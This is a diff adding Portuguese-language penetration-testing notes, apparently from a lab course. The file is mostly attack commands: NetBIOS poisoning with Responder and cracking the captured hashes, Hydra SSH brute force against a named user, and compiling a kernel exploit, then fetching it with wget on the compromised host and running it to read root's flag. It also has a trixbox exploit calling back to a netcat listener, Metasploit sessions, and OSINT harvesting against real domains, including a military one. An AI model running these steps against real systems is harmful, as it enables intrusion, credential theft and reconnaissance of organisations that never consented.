@@ -1,0 +1,168 @@
+bluekeep 
+
+stego tools
+
+open stego
+
+apt-get install steghide
+vi mensagemsecreta.txt
+steghide embed -ef mensagemsecreta.txt -cf paola.jpg -sf paolastego.jpg
+
+steghide extract -sf paolastego.jpg -xf mensagemdescoberta.txt
+cat mensagemdescoberta.txt
+
+TOR
+apt-get install tor proxychains
+ifconfig
+
+nbtscan -r x.x.x.0/24
+
+updatedb
+locate *.nse | grep snmp-
+
+nmap -sU -p 161 --=snmp-win32-shares.nse 172.16.162.136 snmp-check 172.16.162.136
+
+
+
+///
+
+## CAPTURA POR ENVENENAMENTO NETBIOS SAMBA
+
+levanta o servidor de host	enenamento
+responder -I eth0
+
+capturar o hash que ficou gravado em /usr/share/responder/logs
+
+john SMB-NTLMv2-SSP-10.10.10.10.txt
+
+
+## QUEBRA DE SENHAS ONLINE
+
+em tempo real estamos tentando quebra a senha de um usuario chamado eder direto no servidor ssh
+
+hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113
+
+
+## ESCALACAO DE PRIVILEGIO EM LINUX
+
+TERMINAL2 - MEU PARROT
+searchsploit linux local kernel 2.6.x
+cd /tmp
+searchsploit -m 9545.c
+
+TERMINAL1 - MAQUINA INVADIDA
+whereis gcc ----> descubro que nao tem gcc
+
+TERMINAL2 - MEU PARROT
+gcc  -m32 9545.c -o ederzao
+python3 -m http.server 80
+
+TERMINAL1 - MAQUINA INVADIDA
+cd /tmp
+wget [http://192.168.100.7/ederzao](http://192.168.100.7/ederzao)
+chmod a+x ederzao
+./ederzao
+cat /root/flag.txt
+
+NAO UTILIZANDO METASPLOIT
+
+TERMINAL1 - parrot
+apt-get install rlwrap
+searchsploit trixbox 2.6.1
+searchsploit -m [6045.py](http://6045.py/)
+rlwrap nc -lvp 4321
+
+TERMINAL2 - parrot
+python2.7 [6045.py](http://6045.py/) 192.168.10.107 80 192.168.100.7 4321
+
+
+
+## MAQUINA 174 - WINDOWS 10
+
+DESAFIO
+
+---
+
+MAQUINA 107 - TRIXBOX
+
+TERMINAL1
+
+msfconsole
+search trixbox
+use 0
+set rhosts 192.168.10.144
+set lhost 192.168.100.7
+set lport 4321
+exploit
+meterpreter> shell'
+python -c 'import pty;pty.spawn("/bin/bash");
+uname -a
+cat /etc/issue
+
+
+
+## ENUMERATION
+
+DNS
+desafio 192.168.10.100
+
+NFS
+showmount -e 192.168.10.159
+mount -t nfs 192.168.10.159:/home/vulnix /tmp/eder cd /tmp/eder
+
+FTP
+nmap -sV -p 21 192.168.10.0/24 --=ftp-anon.nse
+
+SIP
+apt-get install sip-vicious
+svmap 192.168.10.0/24
+
+SMB
+nbtscan -r 192.168.10.0/24
+
+HTTP/HTTPS
+curl --head [www.smaff.com.br](http://www.smaff.com.br/)
+whatweb [www.smaff.com.br](http://www.smaff.com.br/)
+nikto -h 192.168.10.107
+
+
+escaneamento via hping
+hping3 -S -p 80 192.168.10.101
+
+
+## LEVANTAMENTO DE SISTEMA OPERACIONAL DO ALVO
+
+[https://sitereport.netcraft.com](https://sitereport.netcraft.com/)
+
+theHarvester -d acadi-ti -l 200 -b linkedin
+
+MAPEAMENTO
+[https://www.shodan.io/](https://www.shodan.io/)
+
+procurando emails de um dominio theHarvester -d [11ct.eb.mil.br](http://11ct.eb.mil.br/) -l 500 -b google
+
+CEWL
+cewl -d 2 -m 5 [www.certifiedhacker.com](http://www.certifiedhacker.com/) -u "Firefox 5.1" -w /tmp/dicionario.txt
+
+osrframework
+pip3 install osrframework
+[usufy.py](http://usufy.py/) -n Mark Zuckemberg -p twitter facebook youtube
+
+OSINT
+-------- LAB9.1-RECON-NG RECON-NG
+
+## procura algo em ftp na internet
+
+abrir o site [https://www.searchftps.net/](https://www.searchftps.net/)
+
+## outras formas de levantamento de subdomÃ­nios
+
+[https://dnsdumpster.com](https://dnsdumpster.com/)[https://github.com/tdubs/crt.sh](https://github.com/tdubs/crt.sh) (em bash)
+
+intext:("mysql_connect"|"mysqli_connect") filetype:old
+
+filetype:sql "mysql dump"
+
+DORKS PRONTAS E EXPLOITS
+
+[https://www.exploit-db.com/](https://www.exploit-db.com/)
